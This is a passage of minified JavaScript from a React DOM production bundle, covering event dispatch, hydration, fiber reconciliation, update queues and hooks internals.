e;if((ae||G)&&(G=$.window===$?$:(G=$.ownerDocument)?G.defaultView||G.parentWindow:window,ae?(le=u.relatedTarget||u.toElement,ae=U,le=le?pr(le):null,le!==null&&(et=hr(le),le!==et||le.tag!==5&&le.tag!==6)&&(le=null)):(ae=null,le=U),ae!==le)){if(fe=fd,Z="onMouseLeave",D="onMouseEnter",R="mouse",(n==="pointerout"||n==="pointerover")&&(fe=pd,Z="onPointerLeave",D="onPointerEnter",R="pointer"),et=ae==null?G:Gr(ae),B=le==null?G:Gr(le),G=new fe(Z,R+"leave",ae,u,$),G.target=et,G.relatedTarget=B,Z=null,pr($)===U&&(fe=new fe(D,R+"enter",le,u,$),fe.target=B,fe.relatedTarget=et,Z=fe),et=Z,ae&&le)t:{for(fe=ae,D=le,R=0,B=fe;B;B=Yr(B))R++;for(B=0,Z=D;Z;Z=Yr(Z))B++;for(;0<R-B;)fe=Yr(fe),R--;for(;0<B-R;)D=Yr(D),B--;for(;R--;){if(fe===D||D!==null&&fe===D.alternate)break t;fe=Yr(fe),D=Yr(D)}fe=null}else fe=null;ae!==null&&zd(q,G,ae,fe,!1),le!==null&&et!==null&&zd(q,et,le,fe,!0)}}e:{if(G=U?Gr(U):window,ae=G.nodeName&&G.nodeName.toLowerCase(),ae==="select"||ae==="input"&&G.type==="file")var he=og;else if(_d(G))if(yd)he=dg;else{he=lg;var ge=sg}else(ae=G.nodeName)&&ae.toLowerCase()==="input"&&(G.type==="checkbox"||G.type==="radio")&&(he=cg);if(he&&(he=he(n,U))){Sd(q,he,u,$);break e}ge&&ge(n,G,U),n==="focusout"&&(ge=G._wrapperState)&&ge.controlled&&G.type==="number"&&Fr(G,"number",G.value)}switch(ge=U?Gr(U):window,n){case"focusin":(_d(ge)||ge.contentEditable==="true")&&(jr=ge,ss=U,Yi=null);break;case"focusout":Yi=ss=jr=null;break;case"mousedown":ls=!0;break;case"contextmenu":case"mouseup":case"dragend":ls=!1,vd(q,u,$);break;case"selectionchange":if(pg)break;case"keydown":case"keyup":vd(q,u,$)}var Ee;if(is)e:{switch(n){case"compositionstart":var Ce="onCompositionStart";break e;case"compositionend":Ce="onCompositionEnd";break e;case"compositionupdate":Ce="onCompositionUpdate";break e}Ce=void 0}else Wr?Td(n,u)&&(Ce="onCompositionEnd"):n==="keydown"&&u.keyCode===229&&(Ce="onCompositionStart");Ce&&(md&&u.locale!=="ko"&&(Wr||Ce!=="onCompositionStart"?Ce==="onCompositionEnd"&&Wr&&(Ee=cd()):(Un=$,Jo="value"in Un?Un.value:Un.textContent,Wr=!0)),ge=hu(U,Ce),0<ge.length&&(Ce=new hd(Ce,n,null,u,$),q.push({event:Ce,listeners:ge}),Ee?Ce.data=Ee:(Ee=bd(u),Ee!==null&&(Ce.data=Ee)))),(Ee=ng?rg(n,u):ig(n,u))&&(U=hu(U,"onBeforeInput"),0<U.length&&($=new hd("onBeforeInput","beforeinput",null,u,$),q.push({event:$,listeners:U}),$.data=Ee))}Hd(q,i)})}function Vi(n,i,u){return{instance:n,listener:i,currentTarget:u}}function hu(n,i){for(var u=i+"Capture",c=[];n!==null;){var f=n,m=f.stateNode;f.tag===5&&m!==null&&(f=m,m=Ni(n,u),m!=null&&c.unshift(Vi(n,m,f)),m=Ni(n,i),m!=null&&c.push(Vi(n,m,f))),n=n.return}return c}function Yr(n){if(n===null)return null;do n=n.return;while(n&&n.tag!==5);return n||null}function zd(n,i,u,c,f){for(var m=i._reactName,b=[];u!==null&&u!==c;){var A=u,N=A.alternate,U=A.stateNode;if(N!==null&&N===c)break;A.tag===5&&U!==null&&(A=U,f?(N=Ni(u,m),N!=null&&b.unshift(Vi(u,N,A))):f||(N=Ni(u,m),N!=null&&b.push(Vi(u,N,A)))),u=u.return}b.length!==0&&n.push({event:i,listeners:b})}var Tg=/\r\n?/g,bg=/\u0000|\uFFFD/g;function Wd(n){return(typeof n=="string"?n:""+n).replace(Tg,`
`).replace(bg,"")}function pu(n,i,u){if(i=Wd(i),Wd(n)!==i&&u)throw Error(r(425))}function mu(){}var ms=null,gs=null;function Es(n,i){return n==="textarea"||n==="noscript"||typeof i.children=="string"||typeof i.children=="number"||typeof i.dangerouslySetInnerHTML=="object"&&i.dangerouslySetInnerHTML!==null&&i.dangerouslySetInnerHTML.__html!=null}var Ts=typeof setTimeout=="function"?setTimeout:void 0,_g=typeof clearTimeout=="function"?clearTimeout:void 0,jd=typeof Promise=="function"?Promise:void 0,Sg=typeof queueMicrotask=="function"?queueMicrotask:typeof jd<"u"?function(n){return jd.resolve(null).then(n).catch(yg)}:Ts;function yg(n){setTimeout(function(){throw n})}function bs(n,i){var u=i,c=0;do{var f=u.nextSibling;if(n.removeChild(u),f&&f.nodeType===8)if(u=f.data,u==="/$"){if(c===0){n.removeChild(f),Bi(i);return}c--}else u!=="$"&&u!=="$?"&&u!=="$!"||c++;u=f}while(u);Bi(i)}function Wn(n){for(;n!=null;n=n.nextSibling){var i=n.nodeType;if(i===1||i===3)break;if(i===8){if(i=n.data,i==="$"||i==="$!"||i==="$?")break;if(i==="/$")return null}}return n}function Qd(n){n=n.previousSibling;for(var i=0;n;){if(n.nodeType===8){var u=n.data;if(u==="$"||u==="$!"||u==="$?"){if(i===0)return n;i--}else u==="/$"&&i++}n=n.previousSibling}return null}var Xr=Math.random().toString(36).slice(2),fn="__reactFiber$"+Xr,$i="__reactProps$"+Xr,yn="__reactContainer$"+Xr,_s="__reactEvents$"+Xr,Cg="__reactListeners$"+Xr,xg="__reactHandles$"+Xr;function pr(n){var i=n[fn];if(i)return i;for(var u=n.parentNode;u;){if(i=u[yn]||u[fn]){if(u=i.alternate,i.child!==null||u!==null&&u.child!==null)for(n=Qd(n);n!==null;){if(u=n[fn])return u;n=Qd(n)}return i}n=u,u=n.parentNode}return null}function qi(n){return n=n[fn]||n[yn],!n||n.tag!==5&&n.tag!==6&&n.tag!==13&&n.tag!==3?null:n}function Gr(n){if(n.tag===5||n.tag===6)return n.stateNode;throw Error(r(33))}function gu(n){return n[$i]||null}var Ss=[],Vr=-1;function jn(n){return{current:n}}function Xe(n){0>Vr||(n.current=Ss[Vr],Ss[Vr]=null,Vr--)}function je(n,i){Vr++,Ss[Vr]=n.current,n.current=i}var Qn={},Et=jn(Qn),kt=jn(!1),mr=Qn;function $r(n,i){var u=n.type.contextTypes;if(!u)return Qn;var c=n.stateNode;if(c&&c.__reactInternalMemoizedUnmaskedChildContext===i)return c.__reactInternalMemoizedMaskedChildContext;var f={},m;for(m in u)f[m]=i[m];return c&&(n=n.stateNode,n.__reactInternalMemoizedUnmaskedChildContext=i,n.__reactInternalMemoizedMaskedChildContext=f),f}function It(n){return n=n.childContextTypes,n!=null}function Eu(){Xe(kt),Xe(Et)}function Yd(n,i,u){if(Et.current!==Qn)throw Error(r(168));je(Et,i),je(kt,u)}function Xd(n,i,u){var c=n.stateNode;if(i=i.childContextTypes,typeof c.getChildContext!="function")return u;c=c.getChildContext();for(var f in c)if(!(f in i))throw Error(r(108,Be(n)||"Unknown",f));return C({},u,c)}function Tu(n){return n=(n=n.stateNode)&&n.__reactInternalMemoizedMergedChildContext||Qn,mr=Et.current,je(Et,n),je(kt,kt.current),!0}function Gd(n,i,u){var c=n.stateNode;if(!c)throw Error(r(169));u?(n=Xd(n,i,mr),c.__reactInternalMemoizedMergedChildContext=n,Xe(kt),Xe(Et),je(Et,n)):Xe(kt),je(kt,u)}var Cn=null,bu=!1,ys=!1;function Vd(n){Cn===null?Cn=[n]:Cn.push(n)}function Ag(n){bu=!0,Vd(n)}function Yn(){if(!ys&&Cn!==null){ys=!0;var n=0,i=ze;try{var u=Cn;for(ze=1;n<u.length;n++){var c=u[n];do c=c(!0);while(c!==null)}Cn=null,bu=!1}catch(f){throw Cn!==null&&(Cn=Cn.slice(n+1)),qc(Qo,Yn),f}finally{ze=i,ys=!1}}return null}var qr=[],Kr=0,_u=null,Su=0,Qt=[],Yt=0,gr=null,xn=1,An="";function Er(n,i){qr[Kr++]=Su,qr[Kr++]=_u,_u=n,Su=i}function $d(n,i,u){Qt[Yt++]=xn,Qt[Yt++]=An,Qt[Yt++]=gr,gr=n;var c=xn;n=An;var f=32-Zt(c)-1;c&=~(1<<f),u+=1;var m=32-Zt(i)+f;if(30<m){var b=f-f%5;m=(c&(1<<b)-1).toString(32),c>>=b,f-=b,xn=1<<32-Zt(i)+f|u<<f|c,An=m+n}else xn=1<<m|u<<f|c,An=n}function Cs(n){n.return!==null&&(Er(n,1),$d(n,1,0))}function xs(n){for(;n===_u;)_u=qr[--Kr],qr[Kr]=null,Su=qr[--Kr],qr[Kr]=null;for(;n===gr;)gr=Qt[--Yt],Qt[Yt]=null,An=Qt[--Yt],Qt[Yt]=null,xn=Qt[--Yt],Qt[Yt]=null}var Bt=null,Ht=null,Ge=!1,tn=null;function qd(n,i){var u=$t(5,null,null,0);u.elementType="DELETED",u.stateNode=i,u.return=n,i=n.deletions,i===null?(n.deletions=[u],n.flags|=16):i.push(u)}function Kd(n,i){switch(n.tag){case 5:var u=n.type;return i=i.nodeType!==1||u.toLowerCase()!==i.nodeName.toLowerCase()?null:i,i!==null?(n.stateNode=i,Bt=n,Ht=Wn(i.firstChild),!0):!1;case 6:return i=n.pendingProps===""||i.nodeType!==3?null:i,i!==null?(n.stateNode=i,Bt=n,Ht=null,!0):!1;case 13:return i=i.nodeType!==8?null:i,i!==null?(u=gr!==null?{id:xn,overflow:An}:null,n.memoizedState={dehydrated:i,treeContext:u,retryLane:1073741824},u=$t(18,null,null,0),u.stateNode=i,u.return=n,n.child=u,Bt=n,Ht=null,!0):!1;default:return!1}}function As(n){return(n.mode&1)!==0&&(n.flags&128)===0}function Ls(n){if(Ge){var i=Ht;if(i){var u=i;if(!Kd(n,i)){if(As(n))throw Error(r(418));i=Wn(u.nextSibling);var c=Bt;i&&Kd(n,i)?qd(c,u):(n.flags=n.flags&-4097|2,Ge=!1,Bt=n)}}else{if(As(n))throw Error(r(418));n.flags=n.flags&-4097|2,Ge=!1,Bt=n}}}function Jd(n){for(n=n.return;n!==null&&n.tag!==5&&n.tag!==3&&n.tag!==13;)n=n.return;Bt=n}function yu(n){if(n!==Bt)return!1;if(!Ge)return Jd(n),Ge=!0,!1;var i;if((i=n.tag!==3)&&!(i=n.tag!==5)&&(i=n.type,i=i!=="head"&&i!=="body"&&!Es(n.type,n.memoizedProps)),i&&(i=Ht)){if(As(n))throw Zd(),Error(r(418));for(;i;)qd(n,i),i=Wn(i.nextSibling)}if(Jd(n),n.tag===13){if(n=n.memoizedState,n=n!==null?n.dehydrated:null,!n)throw Error(r(317));e:{for(n=n.nextSibling,i=0;n;){if(n.nodeType===8){var u=n.data;if(u==="/$"){if(i===0){Ht=Wn(n.nextSibling);break e}i--}else u!=="$"&&u!=="$!"&&u!=="$?"||i++}n=n.nextSibling}Ht=null}}else Ht=Bt?Wn(n.stateNode.nextSibling):null;return!0}function Zd(){for(var n=Ht;n;)n=Wn(n.nextSibling)}function Jr(){Ht=Bt=null,Ge=!1}function ks(n){tn===null?tn=[n]:tn.push(n)}var Lg=ie.ReactCurrentBatchConfig;function Ki(n,i,u){if(n=u.ref,n!==null&&typeof n!="function"&&typeof n!="object"){if(u._owner){if(u=u._owner,u){if(u.tag!==1)throw Error(r(309));var c=u.stateNode}if(!c)throw Error(r(147,n));var f=c,m=""+n;return i!==null&&i.ref!==null&&typeof i.ref=="function"&&i.ref._stringRef===m?i.ref:(i=function(b){var A=f.refs;b===null?delete A[m]:A[m]=b},i._stringRef=m,i)}if(typeof n!="string")throw Error(r(284));if(!u._owner)throw Error(r(290,n))}return n}function Cu(n,i){throw n=Object.prototype.toString.call(i),Error(r(31,n==="[object Object]"?"object with keys {"+Object.keys(i).join(", ")+"}":n))}function ef(n){var i=n._init;return i(n._payload)}function tf(n){function i(D,R){if(n){var B=D.deletions;B===null?(D.deletions=[R],D.flags|=16):B.push(R)}}function u(D,R){if(!n)return null;for(;R!==null;)i(D,R),R=R.sibling;return null}function c(D,R){for(D=new Map;R!==null;)R.key!==null?D.set(R.key,R):D.set(R.index,R),R=R.sibling;return D}function f(D,R){return D=Zn(D,R),D.index=0,D.sibling=null,D}function m(D,R,B){return D.index=B,n?(B=D.alternate,B!==null?(B=B.index,B<R?(D.flags|=2,R):B):(D.flags|=2,R)):(D.flags|=1048576,R)}function b(D){return n&&D.alternate===null&&(D.flags|=2),D}function A(D,R,B,Z){return R===null||R.tag!==6?(R=Tl(B,D.mode,Z),R.return=D,R):(R=f(R,B),R.return=D,R)}function N(D,R,B,Z){var he=B.type;return he===me?$(D,R,B.props.children,Z,B.key):R!==null&&(R.elementType===he||typeof he=="object"&&he!==null&&he.$$typeof===Le&&ef(he)===R.type)?(Z=f(R,B.props),Z.ref=Ki(D,R,B),Z.return=D,Z):(Z=Gu(B.type,B.key,B.props,null,D.mode,Z),Z.ref=Ki(D,R,B),Z.return=D,Z)}function U(D,R,B,Z){return R===null||R.tag!==4||R.stateNode.containerInfo!==B.containerInfo||R.stateNode.implementation!==B.implementation?(R=bl(B,D.mode,Z),R.return=D,R):(R=f(R,B.children||[]),R.return=D,R)}function $(D,R,B,Z,he){return R===null||R.tag!==7?(R=Ar(B,D.mode,Z,he),R.return=D,R):(R=f(R,B),R.return=D,R)}function q(D,R,B){if(typeof R=="string"&&R!==""||typeof R=="number")return R=Tl(""+R,D.mode,B),R.return=D,R;if(typeof R=="object"&&R!==null){switch(R.$$typeof){case de:return B=Gu(R.type,R.key,R.props,null,D.mode,B),B.ref=Ki(D,null,R),B.return=D,B;case z:return R=bl(R,D.mode,B),R.return=D,R;case Le:var Z=R._init;return q(D,Z(R._payload),B)}if(Pn(R)||pe(R))return R=Ar(R,D.mode,B,null),R.return=D,R;Cu(D,R)}return null}function G(D,R,B,Z){var he=R!==null?R.key:null;if(typeof B=="string"&&B!==""||typeof B=="number")return he!==null?null:A(D,R,""+B,Z);if(typeof B=="object"&&B!==null){switch(B.$$typeof){case de:return B.key===he?N(D,R,B,Z):null;case z:return B.key===he?U(D,R,B,Z):null;case Le:return he=B._init,G(D,R,he(B._payload),Z)}if(Pn(B)||pe(B))return he!==null?null:$(D,R,B,Z,null);Cu(D,B)}return null}function ae(D,R,B,Z,he){if(typeof Z=="string"&&Z!==""||typeof Z=="number")return D=D.get(B)||null,A(R,D,""+Z,he);if(typeof Z=="object"&&Z!==null){switch(Z.$$typeof){case de:return D=D.get(Z.key===null?B:Z.key)||null,N(R,D,Z,he);case z:return D=D.get(Z.key===null?B:Z.key)||null,U(R,D,Z,he);case Le:var ge=Z._init;return ae(D,R,B,ge(Z._payload),he)}if(Pn(Z)||pe(Z))return D=D.get(B)||null,$(R,D,Z,he,null);Cu(R,Z)}return null}function le(D,R,B,Z){for(var he=null,ge=null,Ee=R,Ce=R=0,ct=null;Ee!==null&&Ce<B.length;Ce++){Ee.index>Ce?(ct=Ee,Ee=null):ct=Ee.sibling;var He=G(D,Ee,B[Ce],Z);if(He===null){Ee===null&&(Ee=ct);break}n&&Ee&&He.alternate===null&&i(D,Ee),R=m(He,R,Ce),ge===null?he=He:ge.sibling=He,ge=He,Ee=ct}if(Ce===B.length)return u(D,Ee),Ge&&Er(D,Ce),he;if(Ee===null){for(;Ce<B.length;Ce++)Ee=q(D,B[Ce],Z),Ee!==null&&(R=m(Ee,R,Ce),ge===null?he=Ee:ge.sibling=Ee,ge=Ee);return Ge&&Er(D,Ce),he}for(Ee=c(D,Ee);Ce<B.length;Ce++)ct=ae(Ee,D,Ce,B[Ce],Z),ct!==null&&(n&&ct.alternate!==null&&Ee.delete(ct.key===null?Ce:ct.key),R=m(ct,R,Ce),ge===null?he=ct:ge.sibling=ct,ge=ct);return n&&Ee.forEach(function(er){return i(D,er)}),Ge&&Er(D,Ce),he}function fe(D,R,B,Z){var he=pe(B);if(typeof he!="function")throw Error(r(150));if(B=he.call(B),B==null)throw Error(r(151));for(var ge=he=null,Ee=R,Ce=R=0,ct=null,He=B.next();Ee!==null&&!He.done;Ce++,He=B.next()){Ee.index>Ce?(ct=Ee,Ee=null):ct=Ee.sibling;var er=G(D,Ee,He.value,Z);if(er===null){Ee===null&&(Ee=ct);break}n&&Ee&&er.alternate===null&&i(D,Ee),R=m(er,R,Ce),ge===null?he=er:ge.sibling=er,ge=er,Ee=ct}if(He.done)return u(D,Ee),Ge&&Er(D,Ce),he;if(Ee===null){for(;!He.done;Ce++,He=B.next())He=q(D,He.value,Z),He!==null&&(R=m(He,R,Ce),ge===null?he=He:ge.sibling=He,ge=He);return Ge&&Er(D,Ce),he}for(Ee=c(D,Ee);!He.done;Ce++,He=B.next())He=ae(Ee,D,Ce,He.value,Z),He!==null&&(n&&He.alternate!==null&&Ee.delete(He.key===null?Ce:He.key),R=m(He,R,Ce),ge===null?he=He:ge.sibling=He,ge=He);return n&&Ee.forEach(function(aE){return i(D,aE)}),Ge&&Er(D,Ce),he}function et(D,R,B,Z){if(typeof B=="object"&&B!==null&&B.type===me&&B.key===null&&(B=B.props.children),typeof B=="object"&&B!==null){switch(B.$$typeof){case de:e:{for(var he=B.key,ge=R;ge!==null;){if(ge.key===he){if(he=B.type,he===me){if(ge.tag===7){u(D,ge.sibling),R=f(ge,B.props.children),R.return=D,D=R;break e}}else if(ge.elementType===he||typeof he=="object"&&he!==null&&he.$$typeof===Le&&ef(he)===ge.type){u(D,ge.sibling),R=f(ge,B.props),R.ref=Ki(D,ge,B),R.return=D,D=R;break e}u(D,ge);break}else i(D,ge);ge=ge.sibling}B.type===me?(R=Ar(B.props.children,D.mode,Z,B.key),R.return=D,D=R):(Z=Gu(B.type,B.key,B.props,null,D.mode,Z),Z.ref=Ki(D,R,B),Z.return=D,D=Z)}return b(D);case z:e:{for(ge=B.key;R!==null;){if(R.key===ge)if(R.tag===4&&R.stateNode.containerInfo===B.containerInfo&&R.stateNode.implementation===B.implementation){u(D,R.sibling),R=f(R,B.children||[]),R.return=D,D=R;break e}else{u(D,R);break}else i(D,R);R=R.sibling}R=bl(B,D.mode,Z),R.return=D,D=R}return b(D);case Le:return ge=B._init,et(D,R,ge(B._payload),Z)}if(Pn(B))return le(D,R,B,Z);if(pe(B))return fe(D,R,B,Z);Cu(D,B)}return typeof B=="string"&&B!==""||typeof B=="number"?(B=""+B,R!==null&&R.tag===6?(u(D,R.sibling),R=f(R,B),R.return=D,D=R):(u(D,R),R=Tl(B,D.mode,Z),R.return=D,D=R),b(D)):u(D,R)}return et}var Zr=tf(!0),nf=tf(!1),xu=jn(null),Au=null,ei=null,Is=null;function Ns(){Is=ei=Au=null}function vs(n){var i=xu.current;Xe(xu),n._currentValue=i}function Rs(n,i,u){for(;n!==null;){var c=n.alternate;if((n.childLanes&i)!==i?(n.childLanes|=i,c!==null&&(c.childLanes|=i)):c!==null&&(c.childLanes&i)!==i&&(c.childLanes|=i),n===u)break;n=n.return}}function ti(n,i){Au=n,Is=ei=null,n=n.dependencies,n!==null&&n.firstContext!==null&&((n.lanes&i)!==0&&(Nt=!0),n.firstContext=null)}function Xt(n){var i=n._currentValue;if(Is!==n)if(n={context:n,memoizedValue:i,next:null},ei===null){if(Au===null)throw Error(r(308));ei=n,Au.dependencies={lanes:0,firstContext:n}}else ei=ei.next=n;return i}var Tr=null;function Os(n){Tr===null?Tr=[n]:Tr.push(n)}function rf(n,i,u,c){var f=i.interleaved;return f===null?(u.next=u,Os(i)):(u.next=f.next,f.next=u),i.interleaved=u,Ln(n,c)}function Ln(n,i){n.lanes|=i;var u=n.alternate;for(u!==null&&(u.lanes|=i),u=n,n=n.return;n!==null;)n.childLanes|=i,u=n.alternate,u!==null&&(u.childLanes|=i),u=n,n=n.return;return u.tag===3?u.stateNode:null}var Xn=!1;function Ps(n){n.updateQueue={baseState:n.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function af(n,i){n=n.updateQueue,i.updateQueue===n&&(i.updateQueue={baseState:n.baseState,firstBaseUpdate:n.firstBaseUpdate,lastBaseUpdate:n.lastBaseUpdate,shared:n.shared,effects:n.effects})}function kn(n,i){return{eventTime:n,lane:i,tag:0,payload:null,callback:null,next:null}}function Gn(n,i,u){var c=n.updateQueue;if(c===null)return null;if(c=c.shared,(Fe&2)!==0){var f=c.pending;return f===null?i.next=i:(i.next=f.next,f.next=i),c.pending=i,Ln(n,u)}return f=c.interleaved,f===null?(i.next=i,Os(c)):(i.next=f.next,f.next=i),c.interleaved=i,Ln(n,u)}function Lu(n,i,u){if(i=i.updateQueue,i!==null&&(i=i.shared,(u&4194240)!==0)){var c=i.lanes;c&=n.pendingLanes,u|=c,i.lanes=u,Go(n,u)}}function uf(n,i){var u=n.updateQueue,c=n.alternate;if(c!==null&&(c=c.updateQueue,u===c)){var f=null,m=null;if(u=u.firstBaseUpdate,u!==null){do{var b={eventTime:u.eventTime,lane:u.lane,tag:u.tag,payload:u.payload,callback:u.callback,next:null};m===null?f=m=b:m=m.next=b,u=u.next}while(u!==null);m===null?f=m=i:m=m.next=i}else f=m=i;u={baseState:c.baseState,firstBaseUpdate:f,lastBaseUpdate:m,shared:c.shared,effects:c.effects},n.updateQueue=u;return}n=u.lastBaseUpdate,n===null?u.firstBaseUpdate=i:n.next=i,u.lastBaseUpdate=i}function ku(n,i,u,c){var f=n.updateQueue;Xn=!1;var m=f.firstBaseUpdate,b=f.lastBaseUpdate,A=f.shared.pending;if(A!==null){f.shared.pending=null;var N=A,U=N.next;N.next=null,b===null?m=U:b.next=U,b=N;var $=n.alternate;$!==null&&($=$.updateQueue,A=$.lastBaseUpdate,A!==b&&(A===null?$.firstBaseUpdate=U:A.next=U,$.lastBaseUpdate=N))}if(m!==null){var q=f.baseState;b=0,$=U=N=null,A=m;do{var G=A.lane,ae=A.eventTime;if((c&G)===G){$!==null&&($=$.next={eventTime:ae,lane:0,tag:A.tag,payload:A.payload,callback:A.callback,next:null});e:{var le=n,fe=A;switch(G=i,ae=u,fe.tag){case 1:if(le=fe.payload,typeof le=="function"){q=le.call(ae,q,G);break e}q=le;break e;case 3:le.flags=le.flags&-65537|128;case 0:if(le=fe.payload,G=typeof le=="function"?le.call(ae,q,G):le,G==null)break e;q=C({},q,G);break e;case 2:Xn=!0}}A.callback!==null&&A.lane!==0&&(n.flags|=64,G=f.effects,G===null?f.effects=[A]:G.push(A))}else ae={eventTime:ae,lane:G,tag:A.tag,payload:A.payload,callback:A.callback,next:null},$===null?(U=$=ae,N=q):$=$.next=ae,b|=G;if(A=A.next,A===null){if(A=f.shared.pending,A===null)break;G=A,A=G.next,G.next=null,f.lastBaseUpdate=G,f.shared.pending=null}}while(!0);if($===null&&(N=q),f.baseState=N,f.firstBaseUpdate=U,f.lastBaseUpdate=$,i=f.shared.interleaved,i!==null){f=i;do b|=f.lane,f=f.next;while(f!==i)}else m===null&&(f.shared.lanes=0);Sr|=b,n.lanes=b,n.memoizedState=q}}function of(n,i,u){if(n=i.effects,i.effects=null,n!==null)for(i=0;i<n.length;i++){var c=n[i],f=c.callback;if(f!==null){if(c.callback=null,c=u,typeof f!="function")throw Error(r(191,f));f.call(c)}}}var Ji={},hn=jn(Ji),Zi=jn(Ji),ea=jn(Ji);function br(n){if(n===Ji)throw Error(r(174));return n}function ws(n,i){switch(je(ea,i),je(Zi,n),je(hn,Ji),n=i.nodeType,n){case 9:case 11:i=(i=i.documentElement)?i.namespaceURI:te(null,"");break;default:n=n===8?i.parentNode:i,i=n.namespaceURI||null,n=n.tagName,i=te(i,n)}Xe(hn),je(hn,i)}function ni(){Xe(hn),Xe(Zi),Xe(ea)}function sf(n){br(ea.current);var i=br(hn.current),u=te(i,n.type);i!==u&&(je(Zi,n),je(hn,u))}function Ds(n){Zi.current===n&&(Xe(hn),Xe(Zi))}var $e=jn(0);function Iu(n){for(var i=n;i!==null;){if(i.tag===13){var u=i.memoizedState;if(u!==null&&(u=u.dehydrated,u===null||u.data==="$?"||u.data==="$!"))return i}else if(i.tag===19&&i.memoizedProps.revealOrder!==void 0){if((i.flags&128)!==0)return i}else if(i.child!==null){i.child.return=i,i=i.child;continue}if(i===n)break;for(;i.sibling===null;){if(i.return===null||i.return===n)return null;i=i.return}i.sibling.return=i.return,i=i.sibling}return null}var Ms=[];function Fs(){for(var n=0;n<Ms.length;n++)Ms[n]._workInProgressVersionPrimary=null;Ms.length=0}var Nu=ie.ReactCurrentDispatcher,Bs=ie.ReactCurrentBatchConfig,_r=0,qe=null,at=null,st=null,vu=!1,ta=!1,na=0,kg=0;function Tt(){throw Error(r(321))}function Hs(n,i){if(i===null)return!1;for(var u=0;u<i.length&&u<n.length;u++)if(!en(n[u],i[u]))return!1;return!0}function Us(n,i,u,c,f,m){if(_r=m,qe=i,i.memoizedState=null,i.updateQueue=null,i.lanes=0,Nu.current=n===null||n.memoizedState===null?Rg:Og,n=u(c,f),ta){m=0;do{if(ta=!1,na=0,25<=m)throw Error(r(301));m+=1,st=at=null,i.updateQueue=null,Nu.current=Pg,n=u(c,f)}while(ta)}if(Nu.current=Pu,i=at!==null&&at.next!==null,_r=0,st=at=qe=null,vu=!1,i)throw Error(r(300));return n}function zs(){var n=na!==0;return na=0,n}function pn(){var n={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return st===null?qe.memoizedState=st=n:st=st.next=n,st}function Gt(){if(at===null){var n=qe.alternate;n=n!==null?n.memoizedState:null}else n=at.next;var i=st===null?qe.memoizedState:st.next;if(i!==null)st=i,at=n;else{if(n===null)throw Error(r(310));at=n,n={memoizedState:at.memoizedState,baseState:at.baseState,baseQueue:at.baseQueue,queue:at.queue,next:null},st===null?qe.memoizedState=st=n:st=st.next=n}return st}function ra(n,i){return typeof i=="function"?i(n):i}function Ws(n){var i=Gt(),u=i.queue;if(u===null)throw Error(r(311));u.lastRenderedReducer=n;var c=at,f=c.baseQueue,m=u.pending;if(m!==null){if(f!==null){var b=f.next;f.next=m.next,m.next=b}c.baseQueue=f=m,u.pending=null}if(f!==null){m=f.next,c=c.baseState;var A=b=null,N=null,U=m;do{var $=U.lane;if((_r&$)===$)N!==null&&(N=N.next={lane:0,action:U.action,hasEagerState:U.hasEagerState,eagerState:U.eagerState,next:null}),c=U.hasEagerState?U.eagerState:n(c,U.action);else{var q={lane:$,action:U.action,hasEagerState:U.hasEagerState,eagerState:U.eagerState,next:null};N===null?(A=N=q,b=c):N=N.next=q,qe.lanes|=$,Sr|=$}U=U.next}while(U!==null&&U!==m);N===null?b=c:N.next=A,en(c,i.memoizedState)||(Nt=!0),i.memoizedState=c,i.baseState=b,i.baseQueue=N,u.lastRenderedState=c}if(n=u.interleaved,n!==null){f=n;do m=f.lane,qe.lanes|=m,Sr|=m,f=f.next;while(f!==n)}else f===null&&(u.lanes=0);return[i.memoizedState,u.dispatch]}function js(n){var i=Gt(),u=i.queue;if(u===null)throw Error(r(311));u.lastRenderedReducer=n;var c=u.dispatch,f=u.pending,m=i.memoizedState;if(f!==null){u.pending=null;var b=f=f.next;do m=n(m,b.action),b=b.next;while(b!==f);en(m,i.memoizedState)||(Nt=!0),i.memoizedState=m,i.baseQueue===null&&(i.baseState=m),u.lastRenderedState=m}return[m,c]}function lf(){}function cf(n,i){var u=qe,c=Gt(),f=i(),m=!en(c.memoizedState,f);if(m&&(c.memoizedState=f,Nt=!0),c=c.queue,Qs(hf.bind(null,u,c,n),[n]),c.getSnapshot!==i||m||st!==null&&st.memoizedState.tag&1){if(u.flags|=2048,ia(9,ff.bind(null,u,c,f,i),void 0,null),lt===null)throw Error(r(349));(_r&30)!==0||df(u,i,f)}return f}function df(n,i,u){n.flags|=16384,n={getSnapshot:i,value:u},i=qe.updateQueue,i===null?(i={lastEffect:null,stores:null},qe.updateQueue=i,i.stores=[n]):(u=i.stores,u===null?i.stores=[n]:u.push(n))}function ff(n,i,u,c){i.value=u,i.getSnapshot=c,pf(i)&&mf(n)}function hf(n,i,u){return u(function(){pf(i)&&mf(n)})}function pf(n){var i=n.getSnapshot;n=n.value;try{var u=i();return!en(n,u)}catch{return!0}}function mf(n){var i=Ln(n,1);i!==null&&un(i,n,1,-1)}function gf(n){var i=pn();return typeof n=="function"&&(n=n()),i.memoizedState=i.baseState=n,n={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:ra,lastRenderedState:n},i.queue=n,n=n.dispatch=vg.bind(null,qe,n),[i.memoizedState,n]}function ia(n,i,u,c){return n={tag:n,create:i,destroy:u,deps:c,next:null},i=qe.updateQueue,i===null?(i={lastEffect:null,stores:null},qe.updateQueue=i,i.lastEffect=n.next=n):(u=i.lastEffect,u===null?i.lastEffect=n.next=n:(c=u.next,u.next=n,n.next=c,i.lastEffect=n)),n}function Ef(){return Gt().memoizedState}function Ru(n,i,u,c){var f=pn();qe.flags|=n,f.memoizedState=ia(1|i,u,void 0,c===void 0?null:c)}function Ou(n,i,u,c){var f=Gt();c=c===void 0?null:c;var m=void 0;if(at!==null){var b=at.memoizedState;if(m=b.destroy,c!==null&&Hs(c,b.deps)){f.memoizedState=ia(i,u,m,c);return}}qe.flags|=n,f.memoizedState=ia(1|i,u,m,c)}function Tf(n,i){return Ru(8390656,8,n,i)}function Qs(n,i){return Ou(2048,8,n,i)}function bf(n,i){return Ou(4,2,n,i)}function _f(n,i){return Ou(4,4,n,i)}function Sf(n,i){if(typeof i=="function")return n=n(),i(n),function(){i(null)};if(i!=null)return n=n(),i.current=n,function(){i.current=null}}function yf(n,i,u){return u=u!=null?u.concat([n]):null,Ou(4,4,Sf.bind(null,i,n),u)}function Ys(){}function Cf(n,i){var u=Gt();i=i===void 0?null:i;var c=u.memoizedState;return c!==null&&i!==null&&Hs(i,c[1])?c[0]:(u.memoizedState=[n,i],n)}function 